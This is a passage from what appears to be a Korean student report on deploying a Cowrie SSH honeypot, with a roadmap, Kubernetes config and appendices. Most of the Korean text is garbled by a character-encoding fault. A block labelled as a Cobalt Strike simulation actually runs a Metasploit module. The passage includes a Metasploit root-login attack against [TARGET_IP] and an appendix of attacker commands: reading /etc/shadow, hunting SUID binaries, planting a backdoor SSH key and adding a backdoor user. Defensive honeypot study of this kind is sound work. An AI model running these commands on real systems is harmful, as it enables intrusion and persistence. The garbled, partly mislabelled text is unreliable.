    def detect_anomaly(self, session):
        features = extract_features([session])
        anomaly_score = self.model.decision_function(features)
        return anomaly_score < -0.5
```

#### 8.4.2 ì¤‘ê¸° ë°œì „ ê³„íš (3-6ê°œì›”)

##### 8.4.2.1 ë¶„ì‚° í—ˆë‹ˆíŒŸ ë„¤íŠ¸ì›Œí¬ êµ¬ì¶•
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   DMZ Honeypot  â”‚    â”‚  Internal Honey â”‚    â”‚  Cloud Honeypot â”‚
â”‚   (ì›¹ ì„œë¹„ìŠ¤)   â”‚â”€â”€â”€â”€â”‚   (íŒŒì¼ ì„œë²„)   â”‚â”€â”€â”€â”€â”‚   (í´ë¼ìš°ë“œ)    â”‚
â”‚                 â”‚    â”‚                 â”‚    â”‚                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚                       â”‚                       â”‚
         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                 â”‚
                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                    â”‚   Central SIEM  â”‚
                    â”‚   (ë¡œê·¸ ìˆ˜ì§‘)   â”‚
                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

##### 8.4.2.2 ìœ„í˜‘ ì¸í…”ë¦¬ì „ìŠ¤ í”Œë«í¼ êµ¬ì¶•
- **MISP (Malware Information Sharing Platform)** ì—°ë™
- **STIX/TAXII** í‘œì¤€ì„ í†µí•œ ìœ„í˜‘ ì •ë³´ ê³µìœ 
- **ìë™í™”ëœ IOC ìƒì„±** ë° ë°°í¬ ì‹œìŠ¤í…œ

##### 8.4.2.3 ê³ ê¸‰ ê³µê²© ì‹œë®¬ë ˆì´ì…˜
```bash
# Metasploitì„ í™œìš©í•œ ê³ ê¸‰ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤
use exploit/linux/ssh/ssh_login
set RHOSTS [TARGET_IP]
set RPORT 2222
set USERNAME root
set PASSWORD password
exploit

# Cobalt Strike ì‹œë®¬ë ˆì´ì…˜
use post/multi/gather/enum_system
run
```

#### 8.4.3 ì¥ê¸° ë¹„ì „ (6ê°œì›”-1ë…„)

##### 8.4.3.1 ìƒìš© ë³´ì•ˆ ì†”ë£¨ì…˜ ì—°ë™
- **Splunk Enterprise Security** ì—°ë™
- **QRadar SIEM** í†µí•©
- **CrowdStrike Falcon** ì—”ë“œí¬ì¸íŠ¸ ë³´í˜¸ ì—°ê³„

##### 8.4.3.2 í´ë¼ìš°ë“œ ë„¤ì´í‹°ë¸Œ í—ˆë‹ˆíŒŸ
```yaml
# Kubernetes ê¸°ë°˜ í—ˆë‹ˆíŒŸ ë°°í¬
apiVersion: apps/v1
kind: Deployment
metadata:
  name: cowrie-honeypot
spec:
  replicas: 3
  selector:
    matchLabels:
      app: cowrie
  template:
    metadata:
      labels:
        app: cowrie
    spec:
      containers:
      - name: cowrie
        image: cowrie/cowrie:latest
        ports:
        - containerPort: 2222
        env:
        - name: COWRIE_LOG_LEVEL
          value: "INFO"
```

##### 8.4.3.3 ì œë¡œíŠ¸ëŸ¬ìŠ¤íŠ¸ ì•„í‚¤í…ì²˜ í†µí•©
- **ë§ˆì´í¬ë¡œì„¸ê·¸ë©˜í…Œì´ì…˜**ì„ í†µí•œ í—ˆë‹ˆíŒŸ ê²©ë¦¬
- **ì ì‘í˜• ì¸ì¦**ì„ í†µí•œ ê´€ë¦¬ ì ‘ê·¼ í†µì œ
- **ì—°ì†ì  ê²€ì¦**ì„ í†µí•œ ë‚´ë¶€ ìœ„í˜‘ íƒì§€

### 8.5 ì¡°ì§ ë‚´ í™œìš© ë°©ì•ˆ

#### 8.5.1 SOC(Security Operations Center) í†µí•©
```
ì‹¤ì‹œê°„ ìœ„í˜‘ íƒì§€ â†’ í—ˆë‹ˆíŒŸ ë°ì´í„° ë¶„ì„ â†’ ë³´ì•ˆ ë£° ì—…ë°ì´íŠ¸ â†’ ì „ì‚¬ ì ìš©
```

#### 8.5.2 ë³´ì•ˆ êµìœ¡ í”„ë¡œê·¸ë¨
- **ë ˆë“œíŒ€/ë¸”ë£¨íŒ€ í›ˆë ¨**: ì‹¤ì œ ê³µê²©ê³¼ ë°©ì–´ ì‹œë‚˜ë¦¬ì˜¤ êµ¬í˜„
- **ë³´ì•ˆ ì¸ì‹ ì œê³ **: ê²½ì˜ì§„ ëŒ€ìƒ ì‹¤ì „í˜• ë³´ì•ˆ ë°ëª¨
- **ì‹ ì… êµìœ¡**: ì‹¤ë¬´í˜• ë³´ì•ˆ ë¶„ì„ê°€ ì–‘ì„± í”„ë¡œê·¸ë¨

#### 8.5.3 ì»´í”Œë¼ì´ì–¸ìŠ¤ ì§€ì›
- **ISO 27001**: ì§€ì†ì  ëª¨ë‹ˆí„°ë§ ìš”êµ¬ì‚¬í•­ ì¶©ì¡±
- **PCI DSS**: ì¹¨ì… íƒì§€ ì‹œìŠ¤í…œ ìš”êµ¬ì‚¬í•­ ë§Œì¡±
- **GDPR**: ê°œì¸ì •ë³´ ì¹¨í•´ ì¡°ê¸° íƒì§€ ì²´ê³„

---

## 9. ì°¸ê³ ë¬¸í—Œ ë° ë¦¬ì†ŒìŠ¤

### 9.1 ê¸°ìˆ  ë¬¸ì„œ
- [Cowrie ê³µì‹ ë¬¸ì„œ](https://cowrie.readthedocs.io/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

### 9.2 ë³´ì•ˆ í‘œì¤€
- ISO/IEC 27001:2013 - Information Security Management
- NIST Cybersecurity Framework v1.1
- SANS Top 20 Critical Security Controls

### 9.3 ì˜¤í”ˆì†ŒìŠ¤ ë„êµ¬
- **T-Pot**: https://github.com/telekom-security/tpotce
- **MISP**: https://www.misp-project.org/
- **TheHive**: https://thehive-project.org/

---

## ğŸ“Š ë¶€ë¡

### A. ìƒì„¸ ë¡œê·¸ ìƒ˜í”Œ
```json
{
  "timestamp": "2024-12-14T10:30:15.123456Z",
  "session": "a1b2c3d4e5f6",
  "src_ip": "[ATTACKER_IP]",
  "src_port": 38670,
  "dst_ip": "[TARGET_IP]", 
  "dst_port": 2222,
  "username": "root",
  "password": "password",
  "command": "cat /etc/passwd",
  "success": true,
  "duration": 0.234,
  "bytes_sent": 1024,
  "bytes_received": 2048
}
```

### B. ê³µê²© ëª…ë ¹ì–´ ëª©ë¡
```bash
# ì‹œìŠ¤í…œ ì •ë³´ ìˆ˜ì§‘
whoami, id, uname -a, hostname, uptime
cat /etc/passwd, cat /etc/shadow, cat /etc/hosts
ps aux, top, netstat -antup, ss -tulpn

# ê¶Œí•œ ìƒìŠ¹ ì‹œë„  
find / -type f -perm -4000 2>/dev/null
find / -type f -perm -2000 2>/dev/null
sudo -l, sudo su -

# ì§€ì†ì„± í™•ë³´
crontab -l, crontab -e
echo "backdoor" >> ~/.ssh/authorized_keys
useradd -m backdoor, passwd backdoor
```

### C. ë°©ì–´ ê¶Œê³ ì‚¬í•­
```bash
# SSH ë³´ì•ˆ ê°•í™”
echo "PasswordAuthentication no" >> /etc/ssh/sshd_config
echo "PermitRootLogin no" >> /etc/ssh/sshd_config
echo "MaxAuthTries 3" >> /etc/ssh/sshd_config

# Fail2ban ì„¤ì •
apt install fail2ban
systemctl enable fail2ban

# ë¡œê·¸ ëª¨ë‹ˆí„°ë§
tail -f /var/log/auth.log | grep -i "failed\|invalid\|break"
```

---

**í”„ë¡œì íŠ¸ ì™„ë£Œì¼**: 2025ë…„ 5ì›” 29ì¼  
**ì‘ì„±ì**: ê¹€ì„±ì£¼ (2401017)

í•´ë‹¹ íŒŒì¼ì€ AI ë¡œ ìš”ì•½ëœ íŒŒì¼ì…ë‹ˆë‹¤.
---

## ğŸ”’ ë³´ì•ˆ ì£¼ì˜ì‚¬í•­

> **ì¤‘ìš”**: ë³¸ ë¬¸ì„œì˜ ëª¨ë“  IP ì£¼ì†ŒëŠ” êµìœ¡ ëª©ì ìœ¼ë¡œ ë§ˆìŠ¤í‚¹ ì²˜ë¦¬ë˜ì—ˆìŠµë‹ˆë‹¤.
> ì‹¤ì œ êµ¬í˜„ ì‹œì—ëŠ” ì ì ˆí•œ IP ì£¼ì†Œë¥¼ ì‚¬ìš©í•˜ì‹œê¸° ë°”ëë‹ˆë‹¤.
> 
> - `[HONEYPOT_IP]`: í—ˆë‹ˆíŒŸ ì„œë²„ IP ì£¼ì†Œ
> - `[ATTACKER_IP]`: ê³µê²©ì ì‹œìŠ¤í…œ IP ì£¼ì†Œ  
> - `[TARGET_IP]`: íƒ€ê²Ÿ ì‹œìŠ¤í…œ IP ì£¼ì†Œ

